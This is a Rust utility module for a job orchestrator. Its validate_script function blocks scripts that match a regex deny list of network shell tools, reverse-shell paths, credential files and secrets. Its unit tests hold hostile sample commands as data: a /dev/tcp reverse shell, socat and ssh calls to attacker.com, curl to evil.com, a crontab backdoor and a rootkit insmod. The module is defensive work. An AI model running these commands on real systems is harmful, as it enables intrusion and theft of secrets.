use crate::client::ClientError;
use axum::http::StatusCode;
use std::fs::File;
use std::io;
use std::io::{Read, Write};
use std::path::PathBuf;
use std::sync::LazyLock;
use tokio::io::AsyncWriteExt;
use walkdir::WalkDir;
use zip::ZipWriter;
use zip::write::FileOptions;

use regex::Regex;

/// Sanitize filename to prevent path traversal attacks
pub fn sanitize_filename(filename: &str) -> String {
    std::path::Path::new(filename)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("file")
        .to_string()
}

/// Save a multipart field to disk
pub async fn save_file(
    mut field: axum::extract::multipart::Field<'_>,
    path: &std::path::Path,
) -> Result<(), (StatusCode, String)> {
    let mut file = tokio::fs::File::create(path).await.map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("File creation failed: {e}"),
        )
    })?;

    let mut buffer = Vec::with_capacity(1024 * 1024); // 1MB buffer

    while let Some(chunk) = field
        .chunk()
        .await
        .map_err(|e| (StatusCode::BAD_REQUEST, format!("Chunk read failed: {e}")))?
    {
        buffer.extend_from_slice(&chunk);

        // Write in chunks to balance memory and performance
        if buffer.len() >= 1024 * 1024 {
            file.write_all(&buffer).await.map_err(|e| {
                (
                    StatusCode::INTERNAL_SERVER_ERROR,
                    format!("Write failed: {e}"),
                )
            })?;
            buffer.clear();
        }
    }

    // Write remaining data
    if !buffer.is_empty() {
        file.write_all(&buffer).await.map_err(|e| {
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("Final write failed: {e}"),
            )
        })?;
    }

    file.flush().await.map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("Flush failed: {e}"),
        )
    })?;

    Ok(())
}

pub fn zip_directory(src_dir: &PathBuf, dst_file: &PathBuf) -> zip::result::ZipResult<()> {
    // Create the output file
    let file = File::create(dst_file)?;
    let mut zip = ZipWriter::new(file);

    // Set options for the zip file with explicit type annotation
    let options: FileOptions<()> = FileOptions::default()
        .compression_method(zip::CompressionMethod::Deflated)
        .unix_permissions(0o755);

    // Walk through the directory
    let walkdir = WalkDir::new(src_dir);
    let it = walkdir.into_iter();

    for entry in it.filter_map(|e| e.ok()) {
        let path = entry.path();
        if let Ok(name) = path.strip_prefix(src_dir) {
            // Skip the root directory itself
            if name.as_os_str().is_empty() {
                continue;
            }

            // Convert path to string
            let name_str = name.to_str().ok_or_else(|| {
                zip::result::ZipError::Io(io::Error::new(
                    io::ErrorKind::InvalidInput,
                    "Invalid UTF-8 in file path",
                ))
            })?;

            if path.is_dir() {
                // Add directory entry
                zip.add_directory(name_str, options)?;
            } else {
                // Add file to the zip archive
                zip.start_file(name_str, options)?;
                let mut f = File::open(path)?;
                let mut buffer = Vec::new();
                f.read_to_end(&mut buffer)?;
                zip.write_all(&buffer)?;
            }
        } else {
            return Err(zip::result::ZipError::Io(io::Error::new(
                io::ErrorKind::InvalidInput,
                "Path prefix mismatch",
            )));
        }
    }

    zip.finish()?;
    Ok(())
}

/// Validate a script for dangerous patterns before execution.
///
/// NOTE: This is NOT a full security solution. It is a basic sanity check
/// that catches obviously dangerous patterns. Input scripts are still
/// expected to come from trusted sources and be clean. This function is
/// a defense-in-depth measure and can be bypassed by determined actors.
pub fn validate_script(path: &std::path::PathBuf) -> Result<(), ClientError> {
    static DANGEROUS_PATTERNS: LazyLock<Vec<(Regex, &'static str)>> = LazyLock::new(|| {
        [
            // Destructive commands
            //  NOTE: This regex will match all `rm` usages and this
            //   could lead to false positives. Keep this in mind
            //   when creating scripts!
            (r"rm\s+(-[a-zA-Z]*)?.*(/|~)", "destructive rm command"),
            (r"\bmkfs\b", "filesystem format command"),
            (r"dd\s+.*of=/dev", "direct device write"),
            (r"dd\s+.*if=/dev/(zero|urandom)", "disk-filling dd command"),
            // Sensitive file access
            (r"/etc/passwd", "access to /etc/passwd"),
            (r"/etc/shadow", "access to /etc/shadow"),
            (r"/etc/sudoers", "access to /etc/sudoers"),
            (r"/proc/", "access to /proc"),
            (r"/sys/", "access to /sys"),
            (r"~/.ssh/", "access to SSH keys"),
            (r"/root/", "access to root home"),
            (r"/var/run/docker\.sock", "access to Docker socket"),
            // Network exfiltration tools
            (r"\bcurl\b", "network tool: curl"),
            (r"\bwget\b", "network tool: wget"),
            (r"\bnc\b", "network tool: nc"),
            (r"\bncat\b", "network tool: ncat"),
            (r"\bsocat\b", "network tool: socat"),
            (r"\bssh\b", "network tool: ssh"),
            (r"\bscp\b", "network tool: scp"),
            (r"\bsftp\b", "network tool: sftp"),
            (r"\btelnet\b", "network tool: telnet"),
            (r"\brsync\b", "network tool: rsync"),
            // Reverse shells
            (r"/dev/tcp/", "reverse shell via /dev/tcp"),
            (r"/dev/udp/", "reverse shell via /dev/udp"),
            // Privilege escalation
            (r"\bsudo\b", "privilege escalation: sudo"),
            (r"su\s+", "privilege escalation: su"),
            (
                r"chmod\s+[0-7]*[4-7][0-7]{2}|chmod\s+\+s",
                "dangerous chmod",
            ),
            (r"\bchown\b", "ownership change: chown"),
            // Container/system escape
            (r"\bchroot\b", "container escape: chroot"),
            (r"\bnsenter\b", "container escape: nsenter"),
            (r"\bunshare\b", "container escape: unshare"),
            (r"\bmount\b", "filesystem manipulation: mount"),
            (r"\bumount\b", "filesystem manipulation: umount"),
            (r"\bdocker\b", "container escape: docker"),
            (r"\bkubectl\b", "container escape: kubectl"),
            // Kernel/system manipulation
            (r"\bsysctl\b", "kernel manipulation: sysctl"),
            (r"\bmodprobe\b", "kernel module: modprobe"),
            (r"\binsmod\b", "kernel module: insmod"),
            (r"\brmmod\b", "kernel module: rmmod"),
            (r"\biptables\b", "firewall manipulation: iptables"),
            (r"\bnftables\b", "firewall manipulation: nftables"),
            // Obfuscated execution
            (
                r"base64.*\|\s*(bash|sh)",
                "obfuscated execution: base64 pipe to shell",
            ),
            (r"\beval\s+", "dynamic code execution: eval"),
            (r"\bpython[23]?\s+-c\b", "inline interpreter: python"),
            (r"\bperl\s+-e\b", "inline interpreter: perl"),
            (r"\bruby\s+-e\b", "inline interpreter: ruby"),
            // Persistence mechanisms
            (r"\bcrontab\b", "persistence: crontab"),
            (r"/etc/cron", "persistence: cron directory"),
            (r"\bsystemctl\b", "persistence: systemctl"),
            (r"\bservice\s+", "persistence: service command"),
            // NOTE: The regex below is an improvment on the `\bat\b` regex
            // that would effectively match anything that has the words `at`
            (
                r"(?m)(?:^|[;&|]{1,2}\s*)at(?:\s+|-|\b)",
                "persistence: at scheduler",
            ),
            // Fork bombs
            (r":\(\)\{.*:\|:", "fork bomb"),
            // Resource exhaustion
            (r"\bstress\b", "resource exhaustion: stress"),
            (r"\bstress-ng\b", "resource exhaustion: stress-ng"),
            // Crypto mining
            (r"\bxmrig\b", "crypto mining: xmrig"),
            (r"\bminerd\b", "crypto mining: minerd"),
            (r"\bcpuminer\b", "crypto mining: cpuminer"),
            // Environment secrets
            (r"\$AWS_", "environment secret: AWS"),
            (r"\$SECRET", "environment secret: SECRET"),
            (r"\$TOKEN", "environment secret: TOKEN"),
            (r"\$PASSWORD", "environment secret: PASSWORD"),
            (r"\$API_KEY", "environment secret: API_KEY"),
        ]
        .into_iter()
        .map(|(pat, desc)| (Regex::new(pat).expect("invalid regex pattern"), desc))
        .collect()
    });

    // Since the script will be loaded fully to memory, check its size!
    const MAX_SCRIPT_SIZE: u64 = 1024 * 1024 * 20; // 20 MiB
    let metadata = std::fs::metadata(path).map_err(|_| ClientError::NoExecScript)?;
    if metadata.len() > MAX_SCRIPT_SIZE {
        return Err(ClientError::UnsafeScript {
            reason: "script too large".to_string(),
        });
    }
    let bytes = std::fs::read(path).map_err(|_| ClientError::NoExecScript)?;
    let content = String::from_utf8(bytes).map_err(|_| ClientError::UnsafeScript {
        reason: "script is not valid UTF-8".to_string(),
    })?;

    for (re, description) in &*DANGEROUS_PATTERNS {
        if re.is_match(&content) {
            return Err(ClientError::UnsafeScript {
                reason: description.to_string(),
            });
        }
    }

    // Ensure script has the required trap for exit code capture
    if !content.contains("trap")
        || !content.contains(".orchestrator.exit")
        || !content.contains("EXIT")
    {
        return Err(ClientError::MissingRequirement {
            reason: "Missing required trap for exit code capture. Add: trap 'echo $? > .orchestrator.exit' EXIT".to_string(),
        });
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    use std::fs;

    // ===== validate_script tests =====
    #[test]
    fn test_validate_script_non_utf8() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        // Write bytes that are not valid UTF-8
        fs::write(&script_path, b"\xff\xfe invalid utf8 \x80\x81").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_clean() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\necho 'Hello, World!'\nexit 0\n").unwrap();
        assert!(validate_script(&script_path).is_ok());
    }

    #[test]
    fn test_validate_script_rm_rf() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\nrm -rf /\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_curl() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\ncurl http://evil.com\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_sudo() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\nsudo apt install something\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_reverse_shell() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4242 0>&1\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_env_secrets() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\necho $AWS_SECRET_KEY\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_base64_pipe_to_shell() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\necho dGVzdA== | base64 -d | bash\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_eval() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\neval \"rm -rf /\"\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_python_inline() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\npython3 -c 'import os; os.system(\"bad\")'\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_nsenter() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\nnsenter --target 1 --mount\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_docker() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\ndocker run --privileged -v /:/host alpine\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_socat() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\nsocat TCP:attacker.com:4444 EXEC:bash\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_crontab() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\ncrontab -l | { cat; echo '* * * * * /tmp/backdoor'; } | crontab -\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_mount() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\nmount /dev/sda1 /mnt\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_ssh() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\nssh user@attacker.com 'cat /etc/hosts'\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_xmrig() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\n./xmrig --pool mining.pool:3333\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_disk_fill() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(
            &script_path,
            b"#!/bin/bash\ndd if=/dev/zero of=/tmp/fill bs=1M count=99999\n",
        )
        .unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_docker_socket() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\ncat /var/run/docker.sock\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    #[test]
    fn test_validate_script_kernel_module() {
        let temp_dir = tempfile::tempdir().unwrap();
        let script_path = temp_dir.path().join("run.sh");
        fs::write(&script_path, b"#!/bin/bash\ninsmod /tmp/rootkit.ko\n").unwrap();
        let result = validate_script(&script_path);
        assert!(matches!(result, Err(ClientError::UnsafeScript { .. })));
    }

    // ===== sanitize_filename tests =====

    #[test]
    fn test_sanitize_filename_normal() {
        assert_eq!(sanitize_filename("test.txt"), "test.txt");
        assert_eq!(sanitize_filename("document.pdf"), "document.pdf");
    }

    #[test]
    fn test_sanitize_filename_path_traversal() {
        // Should strip directory components
        assert_eq!(sanitize_filename("../../../etc/passwd"), "passwd");
        assert_eq!(sanitize_filename("../../file.txt"), "file.txt");
        assert_eq!(sanitize_filename("dir/../file.txt"), "file.txt");
    }

    #[test]
    fn test_sanitize_filename_absolute_path() {
        assert_eq!(sanitize_filename("/etc/passwd"), "passwd");
        assert_eq!(sanitize_filename("/home/user/file.txt"), "file.txt");
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_sanitize_filename_windows_path_on_unix() {
        // On Unix, backslash is not a path separator, so the whole string is treated as filename
        // This is expected behavior - sanitize_filename prevents traversal on the OS it runs on
        assert_eq!(
            sanitize_filename("C:\\Windows\\file.txt"),
            "C:\\Windows\\file.txt"
        );
    }

    #[test]
    fn test_sanitize_filename_multiple_separators() {
        assert_eq!(sanitize_filename("dir1/dir2/dir3/file.txt"), "file.txt");
        assert_eq!(sanitize_filename("a/b/c/d/e/f.dat"), "f.dat");
    }

    #[test]
    fn test_sanitize_filename_empty() {
        assert_eq!(sanitize_filename(""), "file");
    }

    #[test]
    fn test_sanitize_filename_only_path() {
        assert_eq!(sanitize_filename("../../../"), "file");
        assert_eq!(sanitize_filename("/"), "file");
    }

    #[test]
    fn test_sanitize_filename_unicode() {
        assert_eq!(sanitize_filename("文件.txt"), "文件.txt");
        assert_eq!(sanitize_filename("Ñoño.pdf"), "Ñoño.pdf");
    }

    // ===== zip_directory tests =====

    #[test]
    fn test_zip_directory_single_file() -> zip::result::ZipResult<()> {
        let temp_dir = TempDir::new().unwrap();
        let src_dir = temp_dir.path().join("source");
        std::fs::create_dir(&src_dir).unwrap();

        // Create a single file
        let file_path = src_dir.join("test.txt");
        std::fs::write(&file_path, b"Hello, World!").unwrap();

        // Zip it
        let zip_path = temp_dir.path().join("output.zip");
        zip_directory(&src_dir, &zip_path)?;

        // Verify zip was created
        assert!(zip_path.exists());

        // Verify contents
        let file = File::open(&zip_path)?;
        let mut archive = zip::ZipArchive::new(file)?;
        assert_eq!(archive.len(), 1);

        let mut zipped_file = archive.by_name("test.txt")?;
        let mut contents = String::new();
        zipped_file.read_to_string(&mut contents)?;
        assert_eq!(contents, "Hello, World!");

        Ok(())
    }

    #[test]
    fn test_zip_directory_multiple_files() -> zip::result::ZipResult<()> {
        let temp_dir = TempDir::new().unwrap();
        let src_dir = temp_dir.path().join("source");
        std::fs::create_dir(&src_dir).unwrap();

        // Create multiple files
        std::fs::write(src_dir.join("file1.txt"), b"Content 1").unwrap();
        std::fs::write(src_dir.join("file2.txt"), b"Content 2").unwrap();
        std::fs::write(src_dir.join("file3.txt"), b"Content 3").unwrap();

        let zip_path = temp_dir.path().join("output.zip");
        zip_directory(&src_dir, &zip_path)?;

        let file = File::open(&zip_path)?;
        let archive = zip::ZipArchive::new(file)?;
        assert_eq!(archive.len(), 3);

        Ok(())
    }

    #[test]
    fn test_zip_directory_nested() -> zip::result::ZipResult<()> {
        let temp_dir = TempDir::new().unwrap();
        let src_dir = temp_dir.path().join("source");
        std::fs::create_dir(&src_dir).unwrap();

        // Create nested directory structure
        let nested = src_dir.join("nested");
        std::fs::create_dir(&nested).unwrap();
        std::fs::write(nested.join("file.txt"), b"Nested content").unwrap();
        std::fs::write(src_dir.join("root.txt"), b"Root content").unwrap();

        let zip_path = temp_dir.path().join("output.zip");
        zip_directory(&src_dir, &zip_path)?;

        let file = File::open(&zip_path)?;
        let mut archive = zip::ZipArchive::new(file)?;

        // Should have: nested/ (directory), nested/file.txt, root.txt
        assert!(archive.len() >= 2);

        // Verify nested file exists
        let mut nested_file = archive.by_name("nested/file.txt")?;
        let mut contents = String::new();
        nested_file.read_to_string(&mut contents)?;
        assert_eq!(contents, "Nested content");

        Ok(())
    }

    #[test]
    fn test_zip_directory_empty() -> zip::result::ZipResult<()> {
        let temp_dir = TempDir::new().unwrap();
        let src_dir = temp_dir.path().join("source");
        std::fs::create_dir(&src_dir).unwrap();

        let zip_path = temp_dir.path().join("output.zip");
        zip_directory(&src_dir, &zip_path)?;

        // Should create a valid but empty zip
        assert!(zip_path.exists());
        let file = File::open(&zip_path)?;
        let archive = zip::ZipArchive::new(file)?;
        assert_eq!(archive.len(), 0);

        Ok(())
    }

    #[test]
    fn test_zip_directory_nonexistent_source() {
        let temp_dir = TempDir::new().unwrap();
        let src_dir = temp_dir.path().join("nonexistent");
        let zip_path = temp_dir.path().join("output.zip");

        // When source doesn't exist, walkdir creates an empty iterator
        // The zip will be created but will be empty (0 entries)
        let result = zip_directory(&src_dir, &zip_path);

        // The function succeeds but creates an empty zip
        assert!(result.is_ok());
        assert!(zip_path.exists());

        // Verify it's empty
        let file = File::open(&zip_path).unwrap();
        let archive = zip::ZipArchive::new(file).unwrap();
        assert_eq!(archive.len(), 0);
    }

    #[test]
    fn test_zip_directory_invalid_destination() {
        let temp_dir = TempDir::new().unwrap();
        let src_dir = temp_dir.path().join("source");
        std::fs::create_dir(&src_dir).unwrap();

        // Try to write to a directory instead of a file
        let zip_path = PathBuf::from("/nonexistent/path/output.zip");
        let result = zip_directory(&src_dir, &zip_path);
        assert!(result.is_err());
    }
}
